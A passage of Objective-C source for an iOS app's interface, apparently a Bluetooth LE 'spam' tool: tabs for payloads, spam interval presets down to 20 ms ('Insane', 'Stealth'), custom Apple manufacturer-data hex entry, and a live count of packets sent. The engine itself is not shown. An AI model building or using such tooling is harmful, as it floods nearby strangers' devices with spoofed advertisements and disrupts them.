        NSFontAttributeName: [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold]
    } forState:UIControlStateSelected];
    [_presets addTarget:self action:@selector(presetChanged) forControlEvents:UIControlEventValueChanged];

    _valueLabel = label(@"100 ms", [UIFont monospacedDigitSystemFontOfSize:16 weight:UIFontWeightSemibold], CLR_ACCENT);
    _valueLabel.textAlignment = NSTextAlignmentRight;

    _slider = [[UISlider alloc] initWithFrame:CGRectZero];
    _slider.translatesAutoresizingMaskIntoConstraints = NO;
    _slider.minimumValue = 10;
    _slider.maximumValue = 2000;
    _slider.value = 100;
    _slider.minimumTrackTintColor = CLR_ACCENT;
    UIImageSymbolConfiguration *symCfg = [UIImageSymbolConfiguration configurationWithPointSize:12 weight:UIImageSymbolWeightMedium];
    _slider.minimumValueImage = [[UIImage systemImageNamed:@"hare" withConfiguration:symCfg]
                                 imageWithTintColor:CLR_FG2 renderingMode:UIImageRenderingModeAlwaysOriginal];
    _slider.maximumValueImage = [[UIImage systemImageNamed:@"tortoise" withConfiguration:symCfg]
                                 imageWithTintColor:CLR_FG2 renderingMode:UIImageRenderingModeAlwaysOriginal];
    [_slider addTarget:self action:@selector(sliderChanged) forControlEvents:UIControlEventValueChanged];

    _tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    _tableView.translatesAutoresizingMaskIntoConstraints = NO;
    _tableView.backgroundColor = CLR_BG;
    _tableView.separatorColor = CLR_SEP;
    _tableView.dataSource = self;
    _tableView.delegate = self;
    _tableView.rowHeight = UITableViewAutomaticDimension;
    _tableView.estimatedRowHeight = 52;
    [self.view addSubview:_tableView];

    [NSLayoutConstraint activateConstraints:@[
        [_tableView.topAnchor      constraintEqualToAnchor:self.view.topAnchor],
        [_tableView.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [_tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_tableView.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tv { return 2; }

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s {
    return (s == 0) ? 1 : 2;
}

- (NSString *)tableView:(UITableView *)tv titleForHeaderInSection:(NSInteger)s {
    return (s == 0) ? @"Speed Preset" : @"Custom Interval";
}

- (NSString *)tableView:(UITableView *)tv titleForFooterInSection:(NSInteger)s {
    if (s == 0) {
        return @"Presets: 20 ms (Insane) · 50 ms (Fast) · 100 ms (Normal) · 200 ms (Slow) · 500 ms (Stealth).";
    }
    return @"Changes take effect immediately without restarting the active broadcast.";
}

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];
    cell.backgroundColor = CLR_CARD;
    cell.selectionStyle = UITableViewCellSelectionStyleNone;

    if (ip.section == 0) {
        [_presets removeFromSuperview];
        [cell.contentView addSubview:_presets];
        [NSLayoutConstraint activateConstraints:@[
            [_presets.topAnchor      constraintEqualToAnchor:cell.contentView.topAnchor constant:12],
            [_presets.leadingAnchor  constraintEqualToAnchor:cell.contentView.leadingAnchor constant:16],
            [_presets.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-16],
            [_presets.bottomAnchor   constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-12],
            [_presets.heightAnchor   constraintEqualToConstant:32],
        ]];
        return cell;
    }

    if (ip.row == 0) {
        UILabel *rowTitle = label(@"Advertising Delay", [UIFont systemFontOfSize:16 weight:UIFontWeightRegular], CLR_FG);
        [_valueLabel removeFromSuperview];
        [cell.contentView addSubview:rowTitle];
        [cell.contentView addSubview:_valueLabel];
        [NSLayoutConstraint activateConstraints:@[
            [rowTitle.leadingAnchor     constraintEqualToAnchor:cell.contentView.leadingAnchor constant:16],
            [rowTitle.topAnchor         constraintEqualToAnchor:cell.contentView.topAnchor constant:12],
            [rowTitle.bottomAnchor      constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-12],
            [_valueLabel.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-16],
            [_valueLabel.centerYAnchor  constraintEqualToAnchor:rowTitle.centerYAnchor],
        ]];
    } else {
        [_slider removeFromSuperview];
        UILabel *minL = label(@"10 ms", [UIFont systemFontOfSize:11 weight:UIFontWeightRegular], CLR_FG2);
        UILabel *maxL = label(@"2000 ms", [UIFont systemFontOfSize:11 weight:UIFontWeightRegular], CLR_FG2);
        maxL.textAlignment = NSTextAlignmentRight;
        [cell.contentView addSubview:_slider];
        [cell.contentView addSubview:minL];
        [cell.contentView addSubview:maxL];
        [NSLayoutConstraint activateConstraints:@[
            [_slider.topAnchor      constraintEqualToAnchor:cell.contentView.topAnchor constant:12],
            [_slider.leadingAnchor  constraintEqualToAnchor:cell.contentView.leadingAnchor constant:16],
            [_slider.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-16],

            [minL.topAnchor         constraintEqualToAnchor:_slider.bottomAnchor constant:4],
            [minL.leadingAnchor     constraintEqualToAnchor:cell.contentView.leadingAnchor constant:16],
            [minL.bottomAnchor      constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-10],

            [maxL.topAnchor         constraintEqualToAnchor:_slider.bottomAnchor constant:4],
            [maxL.trailingAnchor    constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-16],
            [maxL.bottomAnchor      constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-10],
        ]];
    }
    return cell;
}

- (void)presetChanged {
    NSArray *vals = @[@20, @50, @100, @200, @500];
    NSInteger ms = [vals[_presets.selectedSegmentIndex] integerValue];
    _slider.value = (float)ms;
    _valueLabel.text = [NSString stringWithFormat:@"%ld ms", (long)ms];
    BLESpamEngine.shared.interval = ms / 1000.0;
    UIImpactFeedbackGenerator *h = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleLight];
    [h impactOccurred];
}

- (void)sliderChanged {
    NSInteger ms = ((NSInteger)_slider.value / 10) * 10;
    _valueLabel.text = [NSString stringWithFormat:@"%ld ms", (long)ms];
    BLESpamEngine.shared.interval = ms / 1000.0;
    _presets.selectedSegmentIndex = UISegmentedControlNoSegment;
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Custom Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface CustomVC : UIViewController <UITextFieldDelegate, UITableViewDataSource, UITableViewDelegate>
@property UITextField *hexField;
@property UILabel *parseResult;
@property UITableView *tableView;
@end

@implementation CustomVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Custom";
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeNever;

    _hexField = [[UITextField alloc] initWithFrame:CGRectZero];
    _hexField.translatesAutoresizingMaskIntoConstraints = NO;
    _hexField.backgroundColor = CLR_FIELD;
    _hexField.textColor = CLR_FG;
    _hexField.tintColor = CLR_ACCENT;
    _hexField.font = [UIFont monospacedSystemFontOfSize:15 weight:UIFontWeightRegular];
    _hexField.layer.cornerRadius = 8;
    _hexField.layer.cornerCurve = kCACornerCurveContinuous;
    _hexField.attributedPlaceholder = [[NSAttributedString alloc] initWithString:@"4C 00 07 19 07 00 …"
        attributes:@{NSForegroundColorAttributeName: CLR_FG3}];
    _hexField.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters;
    _hexField.autocorrectionType = UITextAutocorrectionTypeNo;
    _hexField.spellCheckingType = UITextSpellCheckingTypeNo;
    _hexField.keyboardType = UIKeyboardTypeASCIICapable;
    _hexField.clearButtonMode = UITextFieldViewModeWhileEditing;
    _hexField.leftView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 10, 0)];
    _hexField.leftViewMode = UITextFieldViewModeAlways;
    _hexField.returnKeyType = UIReturnKeyDone;
    _hexField.delegate = self;
    [_hexField addTarget:self action:@selector(hexChanged) forControlEvents:UIControlEventEditingChanged];

    // Keyboard toolbar so the user can always dismiss or paste on small iPhones
    UIToolbar *kbBar = [[UIToolbar alloc] initWithFrame:CGRectMake(0, 0, UIScreen.mainScreen.bounds.size.width, 44)];
    kbBar.barStyle = UIBarStyleBlack;
    kbBar.translucent = YES;
    kbBar.tintColor = CLR_ACCENT;
    UIBarButtonItem *pasteItem = [[UIBarButtonItem alloc] initWithTitle:@"Paste"
                                                                  style:UIBarButtonItemStylePlain
                                                                 target:self
                                                                 action:@selector(pasteHex)];
    UIBarButtonItem *flex = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace
                                                                          target:nil
                                                                          action:nil];
    UIBarButtonItem *doneItem = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemDone
                                                                              target:self
                                                                              action:@selector(dismissKeyboard)];
    kbBar.items = @[pasteItem, flex, doneItem];
    _hexField.inputAccessoryView = kbBar;

    _parseResult = label(@"Awaiting HEX input", [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightRegular], CLR_FG2);
    _parseResult.numberOfLines = 0;

    _tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    _tableView.translatesAutoresizingMaskIntoConstraints = NO;
    _tableView.backgroundColor = CLR_BG;
    _tableView.separatorColor = CLR_SEP;
    _tableView.keyboardDismissMode = UIScrollViewKeyboardDismissModeInteractive;
    _tableView.dataSource = self;
    _tableView.delegate = self;
    _tableView.rowHeight = UITableViewAutomaticDimension;
    _tableView.estimatedRowHeight = 52;
    [self.view addSubview:_tableView];

    UITapGestureRecognizer *bgTap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(dismissKeyboard)];
    bgTap.cancelsTouchesInView = NO;
    [_tableView addGestureRecognizer:bgTap];

    [NSLayoutConstraint activateConstraints:@[
        [_tableView.topAnchor      constraintEqualToAnchor:self.view.topAnchor],
        [_tableView.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [_tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_tableView.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];
}

- (void)dismissKeyboard {
    [self.view endEditing:YES];
}

- (void)pasteHex {
    if (UIPasteboard.generalPasteboard.string.length) {
        _hexField.text = UIPasteboard.generalPasteboard.string;
        [self hexChanged];
    }
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tv { return 2; }

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s {
    return (s == 0) ? 2 : 1;
}

- (NSString *)tableView:(UITableView *)tv titleForHeaderInSection:(NSInteger)s {
    return (s == 0) ? @"Raw Manufacturer Data (HEX)" : nil;
}

- (NSString *)tableView:(UITableView *)tv titleForFooterInSection:(NSInteger)s {
    if (s == 0) {
        return @"Enter manufacturer data bytes in hexadecimal (Company ID first, little-endian, e.g. 4C 00 for Apple).";
    }
    return nil;
}

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];
    cell.backgroundColor = CLR_CARD;

    if (ip.section == 0 && ip.row == 0) {
        cell.selectionStyle = UITableViewCellSelectionStyleNone;
        [_hexField removeFromSuperview];
        [cell.contentView addSubview:_hexField];
        [NSLayoutConstraint activateConstraints:@[
            [_hexField.topAnchor      constraintEqualToAnchor:cell.contentView.topAnchor constant:10],
            [_hexField.leadingAnchor  constraintEqualToAnchor:cell.contentView.leadingAnchor constant:12],
            [_hexField.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-12],
            [_hexField.bottomAnchor   constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-10],
            [_hexField.heightAnchor   constraintEqualToConstant:40],
        ]];
        return cell;
    }

    if (ip.section == 0 && ip.row == 1) {
        cell.selectionStyle = UITableViewCellSelectionStyleNone;
        UILabel *statusKey = label(@"Validation", [UIFont systemFontOfSize:14 weight:UIFontWeightRegular], CLR_FG2);
        [_parseResult removeFromSuperview];
        _parseResult.textAlignment = NSTextAlignmentRight;
        [cell.contentView addSubview:statusKey];
        [cell.contentView addSubview:_parseResult];
        [NSLayoutConstraint activateConstraints:@[
            [statusKey.leadingAnchor      constraintEqualToAnchor:cell.contentView.leadingAnchor constant:16],
            [statusKey.topAnchor          constraintEqualToAnchor:cell.contentView.topAnchor constant:12],
            [statusKey.bottomAnchor       constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-12],
            [_parseResult.leadingAnchor   constraintGreaterThanOrEqualToAnchor:statusKey.trailingAnchor constant:12],
            [_parseResult.trailingAnchor  constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-16],
            [_parseResult.centerYAnchor   constraintEqualToAnchor:statusKey.centerYAnchor],
        ]];
        return cell;
    }

    // Section 1: Apply action cell
    UIListContentConfiguration *cfg = [cell defaultContentConfiguration];
    cfg.text = @"Apply & Select Custom Mode";
    cfg.textProperties.color = CLR_ACCENT;
    cfg.textProperties.font = [UIFont systemFontOfSize:16 weight:UIFontWeightSemibold];
    cfg.textProperties.alignment = UIListContentTextAlignmentCenter;
    cell.contentConfiguration = cfg;
    UIView *selBg = [UIView new];
    selBg.backgroundColor = CLR_FIELD;
    cell.selectedBackgroundView = selBg;
    return cell;
}

- (void)tableView:(UITableView *)tv didSelectRowAtIndexPath:(NSIndexPath *)ip {
    [tv deselectRowAtIndexPath:ip animated:YES];
    if (ip.section == 1) {
        [self applyTapped];
    }
}

- (void)hexChanged {
    NSData *d = [self parseHex:_hexField.text];
    if (d) {
        _parseResult.text = [NSString stringWithFormat:@"Valid (%lu bytes)", (unsigned long)d.length];
        _parseResult.textColor = CLR_SUCCESS;
    } else if (_hexField.text.length > 0) {
        _parseResult.text = @"Invalid HEX format";
        _parseResult.textColor = CLR_DANGER;
    } else {
        _parseResult.text = @"Awaiting HEX input";
        _parseResult.textColor = CLR_FG2;
    }
}

- (NSData *)parseHex:(NSString *)s {
    NSString *clean = [[s componentsSeparatedByCharactersInSet:
        [NSCharacterSet characterSetWithCharactersInString:@" :,-"]] componentsJoinedByString:@""];
    if (clean.length < 2 || clean.length % 2 != 0) return nil;
    NSMutableData *d = [NSMutableData data];
    for (NSUInteger i = 0; i < clean.length; i += 2) {
        NSString *b = [clean substringWithRange:NSMakeRange(i, 2)];
        unsigned int v = 0;
        if (![[NSScanner scannerWithString:b] scanHexInt:&v]) return nil;
        uint8_t byte = (uint8_t)v;
        [d appendBytes:&byte length:1];
    }
    return d;
}

- (void)applyTapped {
    NSData *d = [self parseHex:_hexField.text];
    if (!d) {
        UINotificationFeedbackGenerator *f = [UINotificationFeedbackGenerator new];
        [f notificationOccurred:UINotificationFeedbackTypeError];
        return;
    }
    BLESpamEngine.shared.customPayload = d;
    BLESpamEngine.shared.mode = BLEModeCustom;
    UINotificationFeedbackGenerator *f = [UINotificationFeedbackGenerator new];
    [f notificationOccurred:UINotificationFeedbackTypeSuccess];
    _parseResult.text = [NSString stringWithFormat:@"Applied (%lu bytes)", (unsigned long)d.length];
    _parseResult.textColor = CLR_SUCCESS;
    [_hexField resignFirstResponder];
}

- (BOOL)textFieldShouldReturn:(UITextField *)tf {
    [tf resignFirstResponder];
    return YES;
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Logs Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface LogsVC : UIViewController <UITableViewDataSource, UITableViewDelegate>
@property UITableView *tv;
@property NSMutableArray<NSString *> *logs;
@property UILabel *counterLabel;
@end

@implementation LogsVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Logs";
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeNever;

    self.navigationItem.rightBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Clear"
                                                                              style:UIBarButtonItemStylePlain
                                                                             target:self
                                                                             action:@selector(clearLogs)];
    self.navigationItem.rightBarButtonItem.tintColor = CLR_ACCENT;

    _logs = [NSMutableArray array];
    _counterLabel = label(@"0", [UIFont monospacedDigitSystemFontOfSize:16 weight:UIFontWeightSemibold], CLR_ACCENT);
    _counterLabel.textAlignment = NSTextAlignmentRight;

    _tv = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    _tv.translatesAutoresizingMaskIntoConstraints = NO;
    _tv.backgroundColor = CLR_BG;
    _tv.separatorColor = CLR_SEP;
    _tv.dataSource = self;
    _tv.delegate = self;
    _tv.rowHeight = UITableViewAutomaticDimension;
    _tv.estimatedRowHeight = 40;
    [_tv registerClass:[UITableViewCell class] forCellReuseIdentifier:@"log"];
    [self.view addSubview:_tv];

    [NSLayoutConstraint activateConstraints:@[
        [_tv.topAnchor      constraintEqualToAnchor:self.view.topAnchor],
        [_tv.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [_tv.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_tv.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];

    __weak typeof(self) ws = self;
    BLESpamEngine.shared.onPacketSent = ^(NSData *payload, NSUInteger total) {
        NSMutableString *hex = [NSMutableString string];
        const uint8_t *b = payload.bytes;
        for (NSUInteger i = 0; i < MIN(payload.length, 8); i++) {
            [hex appendFormat:@"%02X ", b[i]];
        }
        if (payload.length > 8) [hex appendString:@"…"];
        NSString *entry = [NSString stringWithFormat:@"#%lu   %@", (unsigned long)total, hex];
        dispatch_async(dispatch_get_main_queue(), ^{
            [ws.logs insertObject:entry atIndex:0];
            if (ws.logs.count > 200) [ws.logs removeLastObject];
            ws.counterLabel.text = [NSString stringWithFormat:@"%lu", (unsigned long)total];
            [ws.tv reloadData];
        });
    };
}

- (void)clearLogs {
    [_logs removeAllObjects];
    [_tv reloadData];
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tv { return 2; }

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s {
    if (s == 0) return 1;
    return MAX((NSInteger)_logs.count, 1);
}

- (NSString *)tableView:(UITableView *)tv titleForHeaderInSection:(NSInteger)s {
    return (s == 0) ? @"Session Summary" : @"Live Packet Log";
}

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    if (ip.section == 0) {
        UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];
        cell.backgroundColor = CLR_CARD;
        cell.selectionStyle = UITableViewCellSelectionStyleNone;

        UILabel *titleLbl = label(@"Total Packets Sent", [UIFont systemFontOfSize:16 weight:UIFontWeightRegular], CLR_FG);
        [_counterLabel removeFromSuperview];
        [cell.contentView addSubview:titleLbl];
        [cell.contentView addSubview:_counterLabel];

        [NSLayoutConstraint activateConstraints:@[
            [titleLbl.leadingAnchor       constraintEqualToAnchor:cell.contentView.leadingAnchor constant:16],
            [titleLbl.topAnchor           constraintEqualToAnchor:cell.contentView.topAnchor constant:12],
            [titleLbl.bottomAnchor        constraintEqualToAnchor:cell.contentView.bottomAnchor constant:-12],
            [_counterLabel.trailingAnchor constraintEqualToAnchor:cell.contentView.trailingAnchor constant:-16],
            [_counterLabel.centerYAnchor  constraintEqualToAnchor:titleLbl.centerYAnchor],
        ]];
        return cell;
    }

    UITableViewCell *cell = [tv dequeueReusableCellWithIdentifier:@"log" forIndexPath:ip];
    cell.backgroundColor = CLR_CARD;
    cell.selectionStyle = UITableViewCellSelectionStyleNone;

    UIListContentConfiguration *cfg = [cell defaultContentConfiguration];
    if (_logs.count == 0) {
        cfg.text = @"No packets transmitted yet";
        cfg.textProperties.font = [UIFont systemFontOfSize:14 weight:UIFontWeightRegular];
        cfg.textProperties.color = CLR_FG2;
    } else {
        cfg.text = _logs[ip.row];
        cfg.textProperties.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightRegular];
        cfg.textProperties.color = CLR_FG;
    }
    cfg.directionalLayoutMargins = NSDirectionalEdgeInsetsMake(9, 16, 9, 16);
    cell.contentConfiguration = cfg;
    return cell;
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Tab Bar Controller (Classic Docked Blurred Bar, Pre-Liquid-Glass)
// ─────────────────────────────────────────────────────────────────────────────

@interface MainTabBarController : UITabBarController
@end

@implementation MainTabBarController

- (void)viewDidLoad {
    [super viewDidLoad];

    UITabBar *bar = self.tabBar;
    bar.translucent = YES;
    bar.tintColor = CLR_ACCENT;
    bar.unselectedItemTintColor = CLR_FG2;

    // Native system chrome blur with top hairline separator
    UITabBarAppearance *a = [[UITabBarAppearance alloc] init];
    [a configureWithDefaultBackground];
    a.backgroundEffect = [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemChromeMaterialDark];
    a.backgroundColor = [UIColor colorWithRed:0.09 green:0.09 blue:0.10 alpha:0.82];
    a.shadowColor = [UIColor colorWithWhite:1.0 alpha:0.14];

    NSDictionary *normalAttrs = @{
        NSFontAttributeName: [UIFont systemFontOfSize:10 weight:UIFontWeightMedium],
        NSForegroundColorAttributeName: CLR_FG2
    };
    NSDictionary *selectedAttrs = @{
        NSFontAttributeName: [UIFont systemFontOfSize:10 weight:UIFontWeightSemibold],
        NSForegroundColorAttributeName: CLR_ACCENT
    };

    NSArray<UITabBarItemAppearance *> *layouts = @[
        a.stackedLayoutAppearance,
        a.inlineLayoutAppearance,
        a.compactInlineLayoutAppearance
    ];
    for (UITabBarItemAppearance *item in layouts) {
        item.normal.iconColor = CLR_FG2;
        item.normal.titleTextAttributes = normalAttrs;
        item.selected.iconColor = CLR_ACCENT;
        item.selected.titleTextAttributes = selectedAttrs;
    }

    bar.standardAppearance = a;
    bar.scrollEdgeAppearance = a;

    // ViewControllers with compact blurred Navigation Bars
    UINavigationController * (^makeNav)(UIViewController *, NSString *, NSString *, NSString *) =
    ^UINavigationController *(UIViewController *vc, NSString *title, NSString *icon, NSString *selectedIcon) {
        UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
        UIImageSymbolConfiguration *symCfg = [UIImageSymbolConfiguration configurationWithPointSize:18 weight:UIImageSymbolWeightMedium];
        UIImage *img = [UIImage systemImageNamed:icon withConfiguration:symCfg];
        UIImage *sel = [UIImage systemImageNamed:(selectedIcon ? selectedIcon : icon) withConfiguration:symCfg];
        nav.tabBarItem = [[UITabBarItem alloc] initWithTitle:title image:img selectedImage:sel];

        UINavigationBarAppearance *na = [[UINavigationBarAppearance alloc] init];
        [na configureWithDefaultBackground];
        na.backgroundEffect = [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemChromeMaterialDark];
        na.backgroundColor = [UIColor colorWithRed:0.08 green:0.08 blue:0.09 alpha:0.80];
        na.shadowColor = [UIColor colorWithWhite:1.0 alpha:0.12];
        na.titleTextAttributes = @{
            NSForegroundColorAttributeName: CLR_FG,
            NSFontAttributeName: [UIFont systemFontOfSize:17 weight:UIFontWeightSemibold]
        };
        nav.navigationBar.prefersLargeTitles = NO;
        nav.navigationBar.standardAppearance = na;
        nav.navigationBar.compactAppearance = na;
        nav.navigationBar.scrollEdgeAppearance = na;
        nav.navigationBar.translucent = YES;
        nav.navigationBar.tintColor = CLR_ACCENT;
        return nav;
    };

    self.viewControllers = @[
        makeNav([PayloadsVC new], @"Payloads", @"antenna.radiowaves.left.and.right", @"antenna.radiowaves.left.and.right"),
        makeNav([TimingVC new],   @"Timing",   @"timer",                             @"timer"),
        makeNav([CustomVC new],   @"Custom",   @"wrench.and.screwdriver",            @"wrench.and.screwdriver.fill"),
        makeNav([LogsVC new],     @"Logs",     @"list.bullet.rectangle",             @"list.bullet.rectangle.fill"),
    ];

    // Engine error callback
    BLESpamEngine.shared.onError = ^(NSString *msg) {
        dispatch_async(dispatch_get_main_queue(), ^{
            UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Bluetooth Error"
                                                                       message:msg
                                                                preferredStyle:UIAlertControllerStyleAlert];
            [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            [self presentViewController:a animated:YES completion:nil];
        });
    };
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - AppDelegate + main
// ─────────────────────────────────────────────────────────────────────────────

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.overrideUserInterfaceStyle = UIUserInterfaceStyleDark;
    self.window.tintColor = CLR_ACCENT;
    self.window.rootViewController = [MainTabBarController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, @"AppDelegate");
    }
}
